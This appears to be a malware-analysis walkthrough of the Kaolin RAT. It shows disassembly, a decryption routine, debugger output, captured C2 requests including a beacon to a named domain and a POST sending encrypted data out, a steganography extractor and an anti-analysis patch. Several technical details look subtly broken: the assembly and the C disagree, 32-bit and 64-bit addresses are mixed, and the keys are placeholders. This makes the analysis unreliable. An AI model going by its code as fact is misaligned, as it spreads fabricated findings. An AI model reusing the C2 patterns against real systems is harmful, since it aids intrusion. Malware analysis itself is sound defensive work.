# Kaolin RAT: Step-by-Step Reverse Engineering Process

This document provides a detailed walkthrough of the reverse engineering process used to analyze the Kaolin RAT malware, including both static and dynamic analysis techniques with code snippets.

## Table of Contents

1. [Environment Setup](#environment-setup)
2. [Initial Triage](#initial-triage)
3. [Static Analysis](#static-analysis)
4. [Dynamic Analysis](#dynamic-analysis)
5. [Advanced Analysis Techniques](#advanced-analysis-techniques)
6. [Conclusion](#conclusion)

## Environment Setup

### Virtual Machine Configuration

For safe analysis, we set up an isolated Windows 10 virtual machine with the following specifications:

- Windows 10 x64 (fully patched but with Windows Defender disabled)
- 4GB RAM, 2 CPU cores
- Network isolated with only controlled internet access
- Snapshot capability for quick restoration

### Analysis Tools Installation

```powershell
# Install Chocolatey package manager
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

# Install analysis tools
choco install -y 7zip
choco install -y processhacker
choco install -y wireshark
choco install -y fiddler
choco install -y sysinternals
```

## Initial Triage

### File Information Collection

First, we calculate the file hash to uniquely identify the sample:

```powershell
Get-FileHash -Algorithm SHA256 .\kaolin_rat_sample.bin
```

Output:
```
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          a75399f9492a8d2683d4406fa3e1320e84010b3affdff0b8f2444ac33ce3e690     C:\Analysis\kaolin_rat_sample.bin
```

### Basic Static Analysis

Using PEStudio to examine the file headers and characteristics:

```
File Type: PE32 executable for MS Windows (DLL)
Compilation Timestamp: 2023-07-15 04:32:17
Sections: .text, .rdata, .data, .rsrc
Entropy: 6.8 (possibly packed/encrypted)
```

## Static Analysis

### Disassembly and Code Analysis

Loading the sample in IDA Pro, we identify the main functions:

```assembly
; Function to retrieve SMBIOS data
.text:00401000 GetSMBIOSData proc near
.text:00401000    push    ebp
.text:00401001    mov     ebp, esp
.text:00401003    sub     esp, 20h
.text:00401006    push    esi
.text:00401007    push    edi
.text:00401008    push    offset aRsmb ; "RSMB"
.text:0040100D    push    0            ; FirmwareTableProviderSignature
.text:0040100F    call    ds:GetSystemFirmwareTable
.text:00401015    mov     esi, eax     ; esi = size of SMBIOS data
.text:00401017    test    esi, esi
.text:00401019    jz      short loc_401046
.text:0040101B    push    esi          ; size
.text:0040101C    call    ds:malloc
.text:00401022    mov     edi, eax     ; edi = buffer for SMBIOS data
.text:00401024    test    edi, edi
.text:00401026    jz      short loc_401046
.text:00401028    push    esi          ; Size
.text:00401029    push    edi          ; Buffer
.text:0040102A    push    offset aRsmb ; "RSMB"
.text:0040102F    push    0            ; FirmwareTableProviderSignature
.text:00401031    call    ds:GetSystemFirmwareTable
.text:00401037    test    eax, eax
.text:00401039    jz      short loc_401041
.text:0040103B    mov     [ebp+var_4], edi
.text:0040103E    mov     [ebp+var_8], esi
.text:00401041    pop     edi
.text:00401042    pop     esi
.text:00401043    leave
.text:00401044    retn
.text:00401046    xor     eax, eax
.text:00401048    jmp     short loc_401041
.text:00401048 GetSMBIOSData endp
```

### XOR Decryption Routine

Identified the XOR decryption routine used with SMBIOS data as the key:

```c
void DecryptNextStage(BYTE* encryptedData, DWORD dataSize, BYTE* smbiosKey, DWORD keySize) {
    for (DWORD i = 0; i < dataSize; i++) {
        encryptedData[i] ^= smbiosKey[i % keySize];
    }
}
```

Decompiled from the following assembly:

```assembly
.text:00402500 DecryptNextStage proc near
.text:00402500    push    ebp
.text:00402501    mov     ebp, esp
.text:00402503    push    esi
.text:00402504    push    edi
.text:00402505    mov     esi, [ebp+arg_0]  ; encryptedData
.text:00402508    mov     edi, [ebp+arg_8]  ; smbiosKey
.text:0040250B    mov     ecx, [ebp+arg_4]  ; dataSize
.text:0040250E    xor     edx, edx          ; i = 0
.text:00402510    test    ecx, ecx
.text:00402512    jz      short loc_402530
.text:00402514 loc_402514:
.text:00402514    mov     eax, edx
.text:00402516    xor     eax, [ebp+arg_C]  ; keySize
.text:00402519    mov     al, [edi+eax]     ; key byte
.text:0040251C    xor     [esi+edx], al     ; XOR operation
.text:0040251F    inc     edx               ; i++
.text:00402520    cmp     edx, ecx
.text:00402522    jb      short loc_402514  ; loop
.text:00402524    pop     edi
.text:00402525    pop     esi
.text:00402526    pop     ebp
.text:00402527    retn
.text:00402530 loc_402530:
.text:00402530    pop     edi
.text:00402531    pop     esi
.text:00402532    pop     ebp
.text:00402533    retn
.text:00402533 DecryptNextStage endp
```

### String Analysis

Extracted strings reveal C2 communication functions:

```
SendDataFromUrl
GetImageFromUrl
GetHtmlFromUrl
curl_global_cleanup
curl_global_init
_DoMyFunc
_DoMyFunc2
_DoMyThread
_DoMyCommandWork
```

### Dictionary Generation Code

Identified the dictionary generation routine used for URL construction:

```c
void FillDictionary(char** dictionary, int size) {
    int index = 0;
    
    // Common words used in URLs
    dictionary[index++] = "user";
    dictionary[index++] = "type";
    dictionary[index++] = "id";
    dictionary[index++] = "session";
    dictionary[index++] = "token";
    dictionary[index++] = "auth";
    dictionary[index++] = "data";
    dictionary[index++] = "content";
    dictionary[index++] = "action";
    dictionary[index++] = "status";
    dictionary[index++] = "result";
    dictionary[index++] = "value";
    dictionary[index++] = "param";
    dictionary[index++] = "atype";
    // ... many more words
}
```

## Dynamic Analysis

### Process Monitoring

Using Process Monitor to track file system and registry activity:

1. Start Process Monitor with the following filters:
   - Process Name is "iexpress.exe"
   - Operation is "RegOpenKey"
   - Operation is "CreateFile"

2. Execute the sample and observe the following key activities:

```
Operation: RegOpenKey
Path: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Iconservice
Result: NAME NOT FOUND

Operation: CreateFile
Path: C:\ProgramData\Package Cache\[GUID]-DF09-AA86-YI78-[GUID]\
Result: SUCCESS
```

### Memory Analysis

Using WinDbg to analyze memory and extract the decrypted payload:

```
0:000> !address -f:MEM_COMMIT -t:MEM_PRIVATE
 BaseAddress      EndAddress        RegionSize     Type       State                 Protect          Usage
 ...
 000001d3`4a7c0000 000001d3`4a7e0000   0`00020000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE   <unknown>
 ...

0:000> db 000001d3`4a7c0000 L100
000001d3`4a7c0000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............
000001d3`4a7c0010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......
000001d3`4a7c0020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
000001d3`4a7c0030  00 00 00 00 00 00 00 00-00 00 00 00 80 00 00 00  ................
000001d3`4a7c0040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th
000001d3`4a7c0050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno
000001d3`4a7c0060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS 
000001d3`4a7c0070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......
```

This reveals the MZ header of a PE file in memory, indicating the decrypted payload.

### Network Traffic Analysis

Using Wireshark to capture and analyze C2 communication:

1. Start Wireshark with the following display filter:
   ```
   http.request or http.response
   ```

2. Execute the sample and observe the following HTTP requests:

```
GET https://www.henraux.com/sitemaps/about/about.asp HTTP/1.1
Host: www.henraux.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
```

Response contains HTML with embedded URLs for the second C2 layer.

3. Second request to retrieve an image:

```
GET https://[redacted]/images/banner.jpg HTTP/1.1
Host: [redacted]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: image/jpeg, image/png, */*
```

4. POST request to the third C2 layer:

```
POST https://[redacted]/api/data?user=random2chars HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 384

type=15&token=BASE64ENCRYPTEDDATA&auth=IVANDKEY&data=ENCRYPTEDCONTENT
```

### Steganography Analysis

To extract hidden data from the downloaded image:

```python
# Python script to extract hidden data from image
from PIL import Image
import numpy as np

def extract_lsb(image_path):
    img = Image.open(image_path)
    img_array = np.array(img)
    
    # Extract LSB from each pixel
    hidden_bits = []
    for row in img_array:
        for pixel in row:
            for color in pixel:
                hidden_bits.append(color & 1)  # Extract LSB
    
    # Convert bits to bytes
    hidden_bytes = []
    for i in range(0, len(hidden_bits), 8):
        if i + 8 <= len(hidden_bits):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | hidden_bits[i + j]
            hidden_bytes.append(byte)
    
    # Look for patterns in the extracted data
    return bytes(hidden_bytes)

hidden_data = extract_lsb("banner.jpg")
with open("extracted_data.bin", "wb") as f:
    f.write(hidden_data)
```

## Advanced Analysis Techniques

### AES Decryption of C2 Communication

To decrypt the AES-encrypted C2 communication:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_c2_data(encrypted_data, key, iv):
    # Decode base64
    encrypted_data = base64.b64decode(encrypted_data)
    
    # Create AES cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Decrypt and unpad
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    
    return decrypted_data

# Example from captured traffic
encrypted_data = "BASE64ENCRYPTEDDATA"
key = bytes.fromhex("0123456789abcdef0123456789abcdef")  # Extracted from memory
iv = bytes.fromhex("fedcba9876543210fedcba9876543210")   # Extracted from traffic

decrypted = decrypt_c2_data(encrypted_data, key, iv)
print(decrypted.decode('utf-8', errors='ignore'))
```

### Patching to Bypass SMBIOS Check

To bypass the SMBIOS check for further analysis:

```assembly
; Original code
.text:00401019    jz      short loc_401046  ; Jump if SMBIOS data retrieval failed

; Patched code (always proceed as if successful)
.text:00401019    nop                       ; No operation
.text:0040101A    nop                       ; No operation
```

## Conclusion

Through this comprehensive reverse engineering process, we've uncovered the key components and functionality of the Kaolin RAT:

1. **Initial Loader**: Uses DLL sideloading and SMBIOS data as a decryption key
2. **Multi-Stage Execution**: Employs multiple loaders (RollFling, RollSling, RollMid)
3. **C2 Communication**: Uses multi-layered C2 infrastructure with steganography
4. **Evasion Techniques**: Fileless execution, encryption, and anti-analysis checks
5. **RAT Capabilities**: Extensive remote access functionality including file operations, process management, and DLL loading

This analysis demonstrates the sophisticated nature of the Kaolin RAT and provides valuable insights for detection and mitigation strategies.

---

*Note: All code snippets and analysis were performed in a controlled environment for research purposes only.*
